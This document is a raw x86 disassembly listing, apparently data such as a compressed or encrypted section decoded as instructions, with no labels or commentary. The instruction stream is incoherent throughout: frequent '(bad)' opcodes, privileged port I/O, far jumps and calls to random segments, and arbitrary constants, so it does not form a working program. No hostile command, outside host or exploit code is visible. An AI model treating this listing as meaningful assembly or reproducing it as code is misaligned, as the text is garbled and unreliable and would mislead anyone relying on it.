  422f6a:	ret    0x6cfa
  422f6d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422f6e:	pop    ebp
  422f6f:	mov    edi,0xe4298f52
  422f74:	ja     0x422f8d
  422f76:	and    DWORD PTR [eax-0x76f8fb0b],0xffffff91
  422f7d:	push   0x16
  422f7f:	cmp    cl,dl
  422f81:	ret    
  422f82:	loopne 0x422ffc
  422f84:	scas   eax,DWORD PTR es:[edi]
  422f85:	popf   
  422f86:	cmp    eax,0xda59fee9
  422f8b:	sti    
  422f8c:	fstp   DWORD PTR [esi]
  422f8e:	mov    DWORD PTR [ebx-0x14],ebp
  422f91:	lods   eax,DWORD PTR ds:[esi]
  422f92:	js     0x422ff0
  422f94:	(bad)  
  422f95:	push   edi
  422f96:	adc    al,0xb4
  422f98:	(bad)  
  422f99:	adc    bl,BYTE PTR ds:0x44a6f15b
  422f9f:	mov    bh,dl
  422fa1:	inc    esi
  422fa2:	lds    esp,FWORD PTR [ecx-0x28]
  422fa5:	pop    ds
  422fa6:	cmp    dh,BYTE PTR [esi-0x6a]
  422fa9:	pushf  
  422faa:	mov    ebp,0xe4b725be
  422faf:	mov    BYTE PTR [edi-0x36aad962],bl
  422fb5:	lods   al,BYTE PTR ds:[esi]
  422fb6:	test   eax,0x608cd1cb
  422fbb:	cld    
  422fbc:	out    0xb2,eax
  422fbe:	sbb    ebp,esp
  422fc0:	popf   
  422fc1:	inc    ebp
  422fc2:	mov    esp,0xe2ff653c
  422fc7:	es retf 0x6734
  422fcb:	inc    ebx
  422fcc:	mov    al,0x7e
  422fce:	push   ecx
  422fcf:	xchg   DWORD PTR [ecx+ecx*1],edx
  422fd2:	outs   dx,BYTE PTR cs:[esi]
  422fd4:	mov    edx,0x3bccec54
  422fd9:	inc    edi
  422fda:	cwde   
  422fdb:	dec    edi
  422fdc:	jnp    0x422f6d
  422fde:	add    BYTE PTR [eax],al
  422fe0:	add    BYTE PTR [eax],al
  422fe2:	cvtdq2ps xmm0,XMMWORD PTR [esi+edx*1+0x5b9fdfd4]
  422fea:	dec    ebp
  422feb:	sar    ebx,cl
  422fed:	adc    esp,eax
  422fef:	xor    DWORD PTR [eax+0x1d],esp
  422ff2:	jne    0x422f9d
  422ff4:	add    DWORD PTR [eax],eax
  422ff6:	hlt    
  422ff7:	add    al,0x0
  422ff9:	add    ch,cl
  422ffb:	mov    al,0xb9
  422ffd:	stc    
  422ffe:	nop
  422fff:	or     bl,BYTE PTR [edx-0x4c91073b]
  423005:	ja     0x423082
  423007:	pop    edi
  423008:	adc    eax,0xba44f274
  42300d:	(bad)  
  42300f:	mov    ecx,DWORD PTR [ebx+esi*8-0x77]
  423013:	inc    edi
  423014:	fiadd  WORD PTR [eax+ecx*8+0x52644f0e]
  42301b:	int    0xf3
  42301d:	xchg   esi,eax
  42301e:	and    al,0xeb
  423020:	arpl   WORD PTR [ebp-0x742f6888],sp
  423026:	aaa    
  423027:	xchg   esp,eax
  423028:	jmp    0x1363:0x8c008c0d
  42302f:	ss cmp ebp,edi
  423032:	scas   al,BYTE PTR es:[edi]
  423033:	jmp    0x3c641d33
  423038:	cld    
  423039:	sub    ecx,DWORD PTR [ebx]
  42303b:	adc    eax,0x68dadf90
  423040:	arpl   WORD PTR [eax-0x13dc6635],dx
  423046:	mov    WORD PTR [edi+0x6b],fs
  423049:	xchg   esi,eax
  42304a:	mov    cs,WORD PTR [ebp-0x1fec3a04]
  423050:	(bad)  
  423051:	imul   ebx,DWORD PTR [ecx-0xc],0x7c56ac1d
  423058:	push   esp
  423059:	rol    BYTE PTR [ebx],1
  42305b:	rcr    BYTE PTR [ebx+edx*4-0xd7d7f9c],1
  423062:	pop    edi
  423063:	data16 jne 0x423018
  423066:	aad    0x53
  423068:	ror    esi,1
  42306a:	xchg   DWORD PTR [ecx-0x77269ee8],edi
  423070:	pop    esi
  423071:	shr    BYTE PTR [edi],1
  423073:	call   0x5b5e:0x721cde99
  42307a:	or     al,BYTE PTR [edi+0x6]
  42307d:	jmp    0x423041
  42307f:	call   0xef5f:0x3c49ef9d
  423086:	dec    edx
  423087:	cmp    cl,BYTE PTR [ebp+0xf080179]
  42308d:	test   al,0xcc
  42308f:	aas    
  423090:	adc    esi,DWORD PTR [edx+0x5d24b851]
  423096:	xchg   esp,eax
  423097:	push   edx
  423098:	jl     0x4230fa
  42309a:	jo     0x4230c3
  42309c:	(bad)  
  42309d:	popf   
  42309e:	jle    0x42311d
  4230a0:	jmp    0x423077
  4230a2:	sbb    DWORD PTR [ebx+0x6370f532],edi
  4230a8:	mov    esi,0x6c418ed0
  4230ad:	fild   DWORD PTR [ecx+0x51]
  4230b0:	jae    0x42305b
  4230b2:	sub    ebx,DWORD PTR [edi-0x4b]
  4230b5:	adc    eax,0x2e02bba8
  4230ba:	sbb    eax,0x8fdfc224
  4230bf:	cmp    eax,0x93bbbdde
  4230c4:	push   ds
  4230c5:	arpl   WORD PTR [edx],ax
  4230c7:	test   eax,0x2be6d94
  4230cc:	repz pop edi
  4230ce:	std    
  4230cf:	aad    0x79
  4230d1:	lea    esp,[esi]
  4230d3:	jnp    0x4230f4
  4230d5:	mov    ebx,0xdc31e918
  4230da:	punpckhbw mm0,mm6
  4230dd:	push   edi
  4230de:	push   edx
  4230df:	int    0x5f
  4230e1:	fwait
  4230e2:	cmp    eax,esp
  4230e4:	xchg   ebp,eax
  4230e5:	rol    BYTE PTR [edi],cl
  4230e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4230e8:	xchg   ecx,eax
  4230e9:	jno    0x423100
  4230eb:	(bad)  
  4230ec:	int3   
  4230ed:	mov    es,WORD PTR [ecx-0xe]
  4230f0:	imul   edx,esi,0x821d45ab
  4230f6:	pop    esp
  4230f7:	sbb    BYTE PTR [esi+0x111a4bdd],0x5b
  4230fe:	mov    ebp,0x7c85e457
  423103:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423104:	jp     0x4230de
  423106:	ret    0x426d
  423109:	push   edi
  42310a:	cmp    eax,0x9cf2f3db
  42310f:	cmp    al,0x0
  423111:	dec    edi
  423112:	push   eax
  423113:	iret   
  423114:	adc    dh,BYTE PTR [edi+esi*4+0x29]
  423118:	add    ebx,DWORD PTR [eax-0x46]
  42311b:	sti    
  42311c:	mov    edx,0x8941d35c
  423121:	hlt    
  423122:	je     0x4230a8
  423124:	jg     0x42311c
  423126:	and    BYTE PTR ds:0x2757830e,ch
  42312c:	inc    ebx
  42312d:	test   BYTE PTR [ebp+0x10],al
  423130:	xchg   BYTE PTR [ecx-0x4],cl
  423133:	push   cs
  423134:	cmp    cl,al
  423136:	dec    ebp
  423137:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423138:	mov    ds:0x81554d3b,eax
  42313d:	addr16 add al,0xad
  423140:	dec    esp
  423141:	retf   
  423142:	jle    0x42315a
  423144:	pusha  
  423145:	inc    ebp
  423146:	xchg   esp,eax
  423147:	ficomp DWORD PTR [esi+0x72]
  42314a:	ret    0x809f
  42314d:	in     eax,dx
  42314e:	jg     0x42313c
  423150:	sti    
  423151:	enter  0x8ee2,0x1b
  423155:	cmp    BYTE PTR [esi],bl
  423157:	lods   al,BYTE PTR ds:[esi]
  423158:	dec    esp
  423159:	add    DWORD PTR [ecx+eax*2],eax
  42315c:	inc    edi
  42315d:	test   BYTE PTR [ebp+0x3d2e9f3c],bh
  423163:	(bad)  
  423165:	clc    
  423166:	jecxz  0x423143
  423168:	les    ebx,FWORD PTR [edi]
  42316a:	sbb    ch,BYTE PTR [ebp-0x49d8e9ad]
  423170:	int3   
  423171:	xchg   DWORD PTR [edx+0x2c],ecx
  423174:	das    
  423175:	or     dh,BYTE PTR [edx]
  423177:	pop    ss
  423178:	jecxz  0x423162
  42317a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42317b:	scas   al,BYTE PTR es:[edi]
  42317c:	ja     0x42310e
  42317e:	fcmovbe st,st(5)
  423180:	mov    ds:0x569fe120,al
  423185:	add    BYTE PTR [edx],al
  423187:	cld    
  423188:	aaa    
  423189:	or     al,0x20
  42318b:	addr16 xchg edx,eax
  42318d:	sub    dh,BYTE PTR [edi-0x680fb84f]
  423193:	sub    BYTE PTR [edi],cl
  423195:	inc    esp
  423196:	test   ebp,esi
  423198:	adc    DWORD PTR [ebp-0x43],ebx
  42319b:	and    eax,DWORD PTR [edi]
  42319d:	dec    edx
  42319e:	addr16 lahf 
  4231a0:	sub    cl,BYTE PTR [ebp+0x18]
  4231a3:	sbb    ecx,DWORD PTR [edx+edi*1-0x4e4295a5]
  4231aa:	cmp    eax,0xb9a2db87
  4231af:	aad    0xed
  4231b1:	lock fistp WORD PTR [ecx-0x341bbb83]
  4231b8:	xor    esi,DWORD PTR [ecx+ecx*2]
  4231bb:	add    cl,BYTE PTR [ecx-0xaab5084]
  4231c1:	lods   eax,DWORD PTR ds:[esi]
  4231c2:	mov    cl,0xe2
  4231c4:	adc    BYTE PTR [edi-0x7dbd48a5],ah
  4231ca:	test   edi,edi
  4231cc:	retf   0xedaf
  4231cf:	pop    es
  4231d0:	outs   dx,DWORD PTR ds:[esi]
  4231d1:	in     eax,dx
  4231d2:	push   esp
  4231d3:	addr16 call 0x23c19b84
  4231d9:	jne    0x4231c6
  4231db:	sub    DWORD PTR [edi],edi
  4231dd:	in     al,dx
  4231de:	(bad)  
  4231df:	cmp    dh,BYTE PTR [edx]
  4231e1:	inc    ebx
  4231e2:	sbb    edx,DWORD PTR [esi+0x5e]
  4231e5:	scas   al,BYTE PTR es:[edi]
  4231e6:	call   0xdb24:0x85e33c12
  4231ed:	ror    DWORD PTR [ecx+0x20],1
  4231f0:	inc    edx
  4231f1:	lods   al,BYTE PTR ds:[esi]
  4231f2:	push   esp
  4231f3:	and    ch,cl
  4231f5:	xchg   edx,eax
  4231f6:	mov    ah,0x86
  4231f8:	clc    
  4231f9:	sub    ebx,edx
  4231fb:	(bad)
  4231ff:	loop   0x42321e
  423201:	push   edx
  423202:	add    bl,BYTE PTR [eax+0x36]
  423205:	gs (bad) 
  423207:	ins    DWORD PTR es:[edi],dx
  423208:	sub    BYTE PTR [edi+0x3b670654],cl
  42320e:	mov    esp,0xed3f0e1e
  423213:	cdq    
  423214:	pop    ss
  423215:	jge    0x4231fd
  423217:	bound  ebx,QWORD PTR [ecx+0x25fb4564]
  42321d:	jmp    0x7b21991f
  423222:	jle    0x423223
  423224:	lods   eax,DWORD PTR ds:[esi]
  423225:	sub    eax,esi
  423227:	cld    
  423228:	pop    ebx
  423229:	lods   al,BYTE PTR ds:[esi]
  42322a:	xlat   BYTE PTR ds:[ebx]
  42322b:	sbb    eax,ebx
  42322d:	add    al,0xa4
  42322f:	xchg   ebx,esi
  423231:	jp     0x4232ae
  423233:	into   
  423234:	aas    
  423235:	pop    esp
  423236:	sbb    dh,ch
  423238:	or     DWORD PTR [ebp+0x2a],eax
  42323b:	or     eax,0xf5281e03
  423240:	sbb    eax,0x26c0f809
  423245:	mov    edi,0x9133b78b
  42324a:	or     eax,0x7b54b65f
  42324f:	dec    ebp
  423250:	jmp    0x36326eea
  423255:	pop    ecx
  423256:	mov    ch,0xbc
  423258:	adc    al,0x61
  42325a:	sar    BYTE PTR ds:0x597fdefd,0xb2
  423261:	jmp    0x8c0131ec
  423266:	daa    
  423267:	cmp    dl,dh
  423269:	icebp  
  42326a:	add    al,0x26
  42326c:	iret   
  42326d:	pop    ss
  42326e:	in     eax,dx
  42326f:	inc    edx
  423270:	or     edx,DWORD PTR [edi]
  423272:	push   es
  423273:	jmp    0xc933:0xfe4d1435
  42327a:	add    al,0x79
  42327c:	dec    ecx
  42327d:	ds or  eax,0x1f2e7a06
  423283:	add    BYTE PTR [esi-0x47001382],0x35
  42328a:	sub    esp,DWORD PTR [edx+0x2]
  42328d:	jg     0x4232fd
  42328f:	lahf   
  423290:	mov    ecx,0xbda09348
  423295:	out    0xc1,al
  423297:	sbb    BYTE PTR [eax+0x61],ah
  42329a:	jmp    0x42329f
  42329c:	(bad)  
  42329d:	xchg   esp,eax
  42329e:	jmp    0x4232bd
  4232a0:	popa   
  4232a1:	leave  
  4232a2:	mov    eax,ds:0x568567e0
  4232a7:	sahf   
  4232a8:	imul   edi,DWORD PTR [ecx-0x24a9007f],0x9415036a
  4232b2:	mov    esi,0x1d8b4c2c
  4232b7:	js     0x423240
  4232b9:	xchg   ebp,eax
  4232ba:	mov    WORD PTR [edx],gs
  4232bc:	je     0x4232c5
  4232be:	jmp    0x423310
  4232c0:	mov    edi,0xa575ab82
  4232c5:	call   0x9c05:0x5cdd491f
  4232cc:	cmp    DWORD PTR [ecx-0x214b7582],esi
  4232d2:	(bad)  
  4232d4:	sub    BYTE PTR [eax+ebp*8+0x7ba6fd6a],ch
  4232db:	or     bh,BYTE PTR [esi-0x36c6338b]
  4232e1:	xchg   esp,eax
  4232e2:	sub    eax,0xf83a0a49
  4232e7:	fbld   TBYTE PTR [eax]
  4232e9:	mov    ebp,0x5e9a0a6f
  4232ee:	mov    eax,DWORD PTR [ecx-0x78]
  4232f1:	inc    edx
  4232f2:	repz out dx,eax
  4232f4:	xchg   ebx,eax
  4232f5:	dec    esi
  4232f6:	loope  0x423336
  4232f8:	inc    ebp
  4232f9:	movnti DWORD PTR [eax],eax
  4232fc:	ss mov edx,0x3a74251b
  423302:	add    DWORD PTR [esp+eax*4+0x2e42dc85],esi
  423309:	adc    al,0x26
  42330b:	mov    ch,0x3a
  42330d:	push   ds
  42330e:	das    
  42330f:	call   0x15c1c6cf
  423314:	ja     0x42338f
  423316:	pusha  
  423317:	or     BYTE PTR [edi-0x2e],0xed
  42331b:	lds    ebp,FWORD PTR [eax+eiz*2+0x194fd427]
  423322:	pop    esp
  423323:	cmp    BYTE PTR ds:0x9d1aab28,ah
  423329:	add    al,0x15
  42332b:	pushf  
  42332c:	test   al,0x8c
  42332e:	or     BYTE PTR [esp+edx*4-0x20],dl
  423332:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423333:	fidivr DWORD PTR ds:[esi-0x28]
  423337:	(bad)  
  423338:	std    
  423339:	and    eax,0x520facf4
  42333e:	test   eax,0xd4a9b3fd
  423343:	in     al,0xc9
  423345:	xor    bh,ch
  423347:	enter  0x1683,0xc3
  42334b:	mov    esi,0xbd6641f9
  423350:	jg     0x423342
  423352:	jno    0x4233b9
  423354:	push   edx
  423355:	and    DWORD PTR [edi],edx
  423357:	xor    BYTE PTR [ebx-0x4e],al
  42335a:	std    
  42335b:	sub    ah,BYTE PTR [eax-0x6f3edbee]
  423361:	push   ebx
  423362:	pop    ecx
  423363:	inc    edi
  423364:	jmp    0x3b9a:0x35e07b59
  42336b:	jl     0x4233d5
  42336d:	shr    edx,0x69
  423370:	push   ebp
  423371:	cmp    DWORD PTR [ebx-0x40],edi
  423374:	(bad)  
  423375:	scas   eax,DWORD PTR es:[edi]
  423376:	mov    al,ch
  423378:	xchg   BYTE PTR [ecx+edx*2],bl
  42337b:	cli    
  42337c:	add    eax,0xbab81d9a
  423381:	mov    fs,WORD PTR [ecx+edi*8+0x59]
  423385:	ret    
  423386:	cli    
  423387:	cmp    al,0x59
  423389:	xchg   ecx,eax
  42338a:	je     0x423403
  42338c:	lods   eax,DWORD PTR ds:[esi]
  42338d:	mov    dh,0xcb
  42338f:	shr    dh,1
  423391:	mov    BYTE PTR [esi+0x46],bl
  423394:	mov    al,ds:0x1ec55ee6
  423399:	int    0x85
  42339b:	cdq    
  42339c:	pushf  
  42339d:	jmp    0xfda1:0x4d3b8186
  4233a4:	inc    DWORD PTR [ebp-0x72a94283]
  4233aa:	test   BYTE PTR [esi+0x63eb2251],ch
  4233b0:	or     BYTE PTR [edi+0x5536ea86],bl
  4233b6:	or     ebp,DWORD PTR [eax-0x706c8458]
  4233bc:	xor    al,0x22
  4233be:	ss and dh,BYTE PTR es:[ebp-0x751492ce]
  4233c6:	cmp    DWORD PTR [ecx],ecx
  4233c8:	sub    ecx,DWORD PTR [edx]
  4233ca:	jbe    0x4233e0
  4233cc:	fwait
  4233cd:	stos   BYTE PTR es:[edi],al
  4233ce:	inc    esp
  4233cf:	(bad)  
  4233d0:	and    eax,0x354e2745
  4233d5:	(bad)  
  4233d6:	pop    edi
  4233d7:	pushf  
  4233d8:	xchg   esi,eax
  4233d9:	cmp    BYTE PTR [edi-0xc],dl
  4233dc:	cmp    DWORD PTR [ebx+0x7e205d6c],edi
  4233e2:	lds    esp,FWORD PTR [edx-0x20634fd]
  4233e8:	lea    edx,[esi+0x534e0fc2]
  4233ee:	fild   DWORD PTR [ebp-0x72]
  4233f1:	stc    
  4233f2:	rcl    ebx,cl
  4233f4:	aad    0x70
  4233f6:	sbb    al,0x1c
  4233f8:	xor    BYTE PTR [edi+0x11],0x22
  4233fc:	jge    0x4233e9
  4233fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4233ff:	fmul   DWORD PTR [esi]
  423401:	pop    edi
  423402:	cmp    eax,0x4174f917
  423407:	xchg   esi,eax
  423408:	jnp    0x423394
  42340a:	jae    0x4233b2
  42340c:	pop    ds
  42340d:	sub    al,0x26
  42340f:	jnp    0x423417
  423411:	inc    ebp
  423412:	xor    al,0xf5
  423414:	xchg   esi,eax
  423415:	in     al,0x8a
  423417:	lock fisub DWORD PTR [eax]
  42341a:	pop    ecx
  42341b:	stos   DWORD PTR es:[edi],eax
  42341c:	rol    BYTE PTR [ecx+0x3a70f63f],0x75
  423423:	fdiv   QWORD PTR [ebp+0x48]
  423426:	jp     0x423484
  423428:	jno    0x42349b
  42342a:	bound  edi,QWORD PTR [ebp+0x786d4b]
  423430:	test   BYTE PTR [ebp-0x26],0xb1
  423434:	pop    ds
  423435:	mov    esp,0xef3e1cf7
  42343a:	in     eax,dx
  42343b:	loopne 0x423450
  42343d:	pop    es
  42343e:	sbb    BYTE PTR [edi+eiz*2+0x21],dl
  423442:	mov    edi,0x20eee295
  423447:	ror    DWORD PTR [ebx+0xf90d6c8],cl
  42344d:	dec    esp
  42344e:	dec    ebp
  42344f:	nop
  423450:	cdq    
  423451:	fld    DWORD PTR [ebx+0x377967bf]
  423457:	jbe    0x42346d
  423459:	inc    esi
  42345a:	fsub   DWORD PTR [ebx+0x53]
  42345d:	ins    BYTE PTR es:[edi],dx
  42345e:	out    0x2a,al
  423460:	or     DWORD PTR [eax+0x23],ecx
  423463:	imul   esp,DWORD PTR [ecx-0x1c],0x3
  423467:	cmc    
  423468:	aam    0xe4
  42346a:	(bad)  
  42346b:	and    ch,BYTE PTR [ecx-0x706bc27a]
  423471:	adc    al,0xc6
  423473:	into   
  423474:	sub    ecx,edx
  423476:	gs cli 
  423478:	mov    bl,0x93
  42347a:	leave  
  42347b:	fsubr  DWORD PTR [ebx]
  42347d:	mov    eax,ds:0x7e99c8cf
  423482:	sbb    DWORD PTR [edi-0x4e963b0],0xffffffe3
  423489:	fdivr  QWORD PTR [ebx+0x70]
  42348c:	popf   
  42348d:	mov    bh,BYTE PTR [ecx]
  42348f:	sbb    BYTE PTR [ecx+ecx*1],0x5b
  423493:	dec    edx
  423494:	pop    ds
  423495:	sbb    al,0x6
  423497:	cwde   
  423498:	inc    BYTE PTR [eax+0x40]
  42349b:	jg     0x42345a
  42349d:	pop    esi
  42349e:	inc    eax
  42349f:	cli    
  4234a0:	dec    ecx
  4234a1:	xchg   BYTE PTR [ebx-0x838ed79],ch
  4234a7:	(bad)  
  4234a8:	repz dec ebp
  4234aa:	cmp    bh,BYTE PTR [ebp+0x7f6b2aa9]
  4234b0:	sub    BYTE PTR [ecx+0x56],bl
  4234b3:	fst    QWORD PTR [ebx-0x57]
  4234b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4234b7:	and    eax,0xf7e55f9c
  4234bc:	pop    edi
  4234bd:	xor    al,0x61
  4234bf:	jns    0x423468
  4234c1:	cdq    
  4234c2:	mov    cl,0xa8
  4234c4:	pop    eax
  4234c5:	gs pusha 
  4234c7:	aad    0xce
  4234c9:	and    esp,DWORD PTR [ebp-0x5f]
  4234cc:	jns    0x423539
  4234ce:	xchg   esi,eax
  4234cf:	ja     0x42347d
  4234d1:	call   0xb70b:0xfb27a60f
  4234d8:	jns    0x423481
  4234da:	push   ss
  4234db:	lods   al,BYTE PTR ds:[esi]
  4234dc:	outs   dx,BYTE PTR ds:[esi]
  4234dd:	icebp  
  4234de:	lock ds pop ecx
  4234e1:	adc    esp,edx
  4234e3:	dec    ebp
  4234e4:	push   cs
  4234e5:	sub    esp,DWORD PTR [edx+0xda58b7d]
  4234eb:	pop    ebx
  4234ec:	jle    0x4234b5
  4234ee:	add    BYTE PTR [eax],al
  4234f0:	add    BYTE PTR [eax],al
  4234f2:	dec    ecx
  4234f3:	mov    ds:0xf6ffd655,eax
  4234f8:	retf   
  4234f9:	mov    edi,0x3f1d56c2
  4234fe:	aad    0xce
  423500:	(bad)
  423504:	add    DWORD PTR [eax],eax
  423506:	hlt    
  423507:	add    al,0x0
  423509:	add    cl,dl
  42350b:	adc    BYTE PTR [edi+0x6b],bl
  42350e:	ss imul edi,ecx,0x91c27b41
  423515:	xchg   esp,eax
  423516:	repz inc edx
  423518:	xchg   edi,eax
  423519:	push   edi
  42351a:	(bad)  
  42351b:	fisub  DWORD PTR [esi-0x5f]
  42351e:	(bad)  
  42351f:	bound  esp,QWORD PTR [ecx+0x7c]
  423522:	fwait
  423523:	loope  0x4234be
  423525:	mov    dh,0x9f
  423527:	add    BYTE PTR [edi+0x17],0x27
  42352b:	push   esp
  42352c:	das    
  42352d:	les    eax,FWORD PTR [ebx]
  42352f:	sub    DWORD PTR [edi+0x9533465],0x372501d6
  423539:	mov    edx,0x93b343f8
  42353e:	jecxz  0x423527
  423540:	jns    0x42351d
  423542:	mov    ah,0xfc
  423544:	lds    edx,FWORD PTR [ecx+0x598961cc]
  42354a:	sbb    DWORD PTR [edx+0x3845dba1],0x52
  423551:	(bad)  
  423552:	outs   dx,DWORD PTR ds:[esi]
  423553:	imul   eax,DWORD PTR [ecx],0xffffffb9
  423556:	loope  0x42352c
  423558:	dec    edx
  423559:	or     al,0x8b
  42355b:	cmp    ebx,ebp
  42355d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42355e:	popa   
  42355f:	dec    edx
  423560:	mov    eax,0x8050195c
  423565:	arpl   si,si
  423567:	cmp    BYTE PTR [edx+eiz*8+0x145a12d5],ah
  42356e:	ret    
  42356f:	(bad)  
  423570:	sub    WORD PTR [esi+ebp*4-0x4],si
  423575:	jle    0x42352f
  423577:	popa   
  423578:	dec    eax
  423579:	sub    BYTE PTR [ecx],bl
  42357b:	pop    es
  42357c:	and    BYTE PTR [eax+0x3779bc11],bh
  423582:	retf   
  423583:	lea    edx,[ecx-0x627468c8]
  423589:	bsf    esi,edx
  42358c:	por    mm2,QWORD PTR [ecx]
  42358f:	dec    eax
  423590:	inc    ebp
  423591:	mov    esp,edi
  423593:	dec    ecx
  423594:	test   dh,ch
  423596:	scas   al,BYTE PTR es:[edi]
  423597:	jno    0x42357d
  423599:	xchg   esp,eax
  42359a:	(bad)  
  42359b:	fwait
  42359c:	imul   eax,DWORD PTR [ebx-0x62],0xfffffff7
  4235a0:	mov    ah,BYTE PTR [ebx-0x282a8960]
  4235a6:	jmp    0xb556:0x8967f299
  4235ad:	push   esi
  4235ae:	mov    ?,WORD PTR [ebx]
  4235b0:	scas   eax,DWORD PTR es:[edi]
  4235b1:	mov    al,0xb0
  4235b3:	dec    ecx
  4235b4:	inc    eax
  4235b5:	sbb    DWORD PTR [ebp-0x71],0xffffffff
  4235b9:	fadd   QWORD PTR [edi]
  4235bb:	push   ebx
  4235bc:	gs clc 
  4235be:	int3   
  4235bf:	sbb    al,0xf9
  4235c2:	call   0x6780:0xdc98bab3
  4235c9:	sbb    bh,ah
  4235cb:	mov    eax,0x61937078
  4235d0:	cmp    BYTE PTR [edi*8+0x6260d39a],0x98
  4235d8:	pop    es
  4235d9:	mov    ds,WORD PTR [edx]
  4235db:	push   edi
  4235dc:	add    DWORD PTR [esi+edx*4+0x6b],esi
  4235e0:	cmp    bl,BYTE PTR [ecx]
  4235e2:	xor    bl,BYTE PTR [eax+0x2996ddb6]
  4235e8:	and    eax,0xc399c446
  4235ed:	or     BYTE PTR [edi],dh
  4235ef:	mov    edi,es
  4235f1:	inc    edi
  4235f2:	lds    eax,FWORD PTR [ecx]
  4235f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4235f5:	stc    
  4235f6:	(bad)
  4235f9:	stc    
  4235fa:	stos   DWORD PTR es:[edi],eax
  4235fb:	addr16 mov ebx,0xe149ebe3
  423601:	cmp    DWORD PTR ds:0xd276aa19,edi
  423607:	and    eax,0x7a513f7e
  42360c:	dec    edi
  42360d:	imul   edx,edi,0xf3b5aa6b
  423613:	push   esi
  423614:	jg     0x42360f
  423616:	sub    BYTE PTR [ebx+0x17],ah
  423619:	cmp    DWORD PTR [esi+ecx*8+0x1f],esi
  42361d:	(bad)  
  42361e:	xor    edx,DWORD PTR [ebx+ecx*2+0x63]
  423622:	(bad)  
  423623:	(bad)  
  423624:	mov    dl,0xe4
  423626:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423627:	jns    0x423607
  423629:	push   eax
  42362a:	xchg   esi,eax
  42362b:	push   ecx
  42362c:	imul   esp,DWORD PTR [esi+0x5b],0x56
  423630:	stc    
  423631:	and    al,0xc9
  423633:	push   ss
  423634:	sbb    DWORD PTR [edi-0x6a],ecx
  423637:	loopne 0x423607
  423639:	pop    ecx
  42363a:	fs daa 
  42363c:	pop    ecx
  42363d:	jnp    0x4235fa
  42363f:	jns    0x4235e0
  423641:	push   0xffffff84
  423643:	mov    ch,BYTE PTR [ebp+eax*1-0x61]
  423647:	stos   DWORD PTR es:[edi],eax
  423648:	and    eax,0x715b1dd7
  42364d:	sub    esi,eax
  42364f:	push   esp
  423650:	mov    eax,ds:0x49366b22
  423655:	mov    ecx,0x308dbd60
  42365a:	pop    es
  42365b:	inc    esi
  42365c:	daa    
  42365d:	jge    0x4236ab
  42365f:	mov    ecx,0xe8879196
  423664:	ss addr16 fwait
  423667:	jae    0x423676
  423669:	fimul  WORD PTR [eax+0x5c14dac2]
  42366f:	and    cl,BYTE PTR [esi+edi*4+0x51]
  423673:	popa   
  423674:	mov    esi,0xb510aed3
  423679:	cwde   
  42367a:	jge    0x4236ac
  42367c:	sub    DWORD PTR [esi-0x5737e9bd],esp
  423682:	pop    ss
  423683:	(bad)  
  423684:	lods   eax,DWORD PTR ds:[esi]
  423685:	idiv   BYTE PTR [eax+0x2abc872b]
  42368b:	ins    DWORD PTR es:[edi],dx
  42368c:	out    0xc2,eax
  42368e:	or     cl,0x2e
  423691:	shl    BYTE PTR [ebx-0x16b3fe68],0xf3
  423698:	xchg   ebx,eax
  423699:	jg     0x4236aa
  42369b:	int    0x42
  42369d:	jecxz  0x423634
  42369f:	adc    bh,BYTE PTR [ebp-0x28fead8e]
  4236a5:	mov    al,ds:0x3cfb06de
  4236aa:	sbb    al,0xbf
  4236ac:	jne    0x4236cb
  4236ae:	mov    esp,0x631749f6
  4236b3:	sbb    DWORD PTR [ebx+0x40],ebx
  4236b6:	push   ebp
  4236b7:	push   ebp
  4236b8:	daa    
  4236b9:	fcom   QWORD PTR [ebp+0x70]
  4236bc:	cld    
  4236bd:	out    dx,eax
  4236be:	or     DWORD PTR [ebx-0x7f23789],esp
  4236c4:	pop    ebx
  4236c5:	das    
  4236c6:	(bad)  
  4236c7:	mov    al,0x9f
  4236c9:	and    al,0x7d
  4236cb:	outs   dx,DWORD PTR ds:[esi]
  4236cc:	(bad)  
  4236cd:	xor    DWORD PTR [ebx+0x2a9d5288],0x174258a1
  4236d7:	jo     0x4236cf
  4236d9:	sahf   
  4236da:	leave  
  4236db:	enter  0x6877,0xfb
  4236df:	cli    
  4236e0:	push   ecx
  4236e1:	pop    ecx
  4236e2:	cmp    al,0xe9
  4236e4:	mov    ds,WORD PTR [edx+0x2c03a3f]
  4236ea:	push   esp
  4236eb:	imul   esi,DWORD PTR [edx-0x24],0x3f36e6e0
  4236f2:	adc    eax,0xa00f23e1
  4236f7:	aaa    
  4236f8:	push   es
  4236f9:	(bad)  
  4236fb:	sbb    eax,0x9d0cca4b
  423700:	and    esp,0xf6f0227e
  423706:	and    al,0xcb
  423708:	mov    esi,0x2af2d57b
  42370d:	pop    edi
  42370e:	xchg   edi,edi
  423710:	mov    ecx,?
  423712:	cwde   
  423713:	inc    edx
  423714:	push   edi
  423715:	mov    ecx,0x6a1f31a7
  42371a:	fsub   st,st(4)
  42371c:	pop    ebx
  42371d:	fmul   QWORD PTR [eax+0x5f2fa81e]
  423723:	or     DWORD PTR [edi+0x6ebbd292],eax
  423729:	cmp    eax,0x7fdc3cb9
  42372e:	dec    eax
  42372f:	add    ebp,DWORD PTR [edx-0xf]
  423732:	push   ebp
  423733:	dec    edi
  423734:	inc    esp
  423735:	add    BYTE PTR [ebx+0x77],dh
  423738:	cmp    DWORD PTR [ebx],0xffffffa1
  42373b:	jl     0x4237b2
  42373d:	lods   eax,DWORD PTR ds:[esi]
  42373e:	mov    ebx,0x8257e818
  423743:	js     0x4237af
  423745:	cmp    al,0xe6
  423747:	repnz pop edx
  423749:	xor    DWORD PTR [eax-0x5f],edi
  42374c:	push   ebx
  42374d:	(bad)  
  42374e:	out    dx,al
  42374f:	or     al,0xc0
  423751:	sar    ebx,1
  423753:	mov    esp,0xe04d62de
  423758:	xor    eax,0x8d2ea267
  42375d:	fdiv   st,st(2)
  42375f:	add    BYTE PTR [eax-0x25],bl
  423762:	xchg   edi,ebp
  423764:	dec    esi
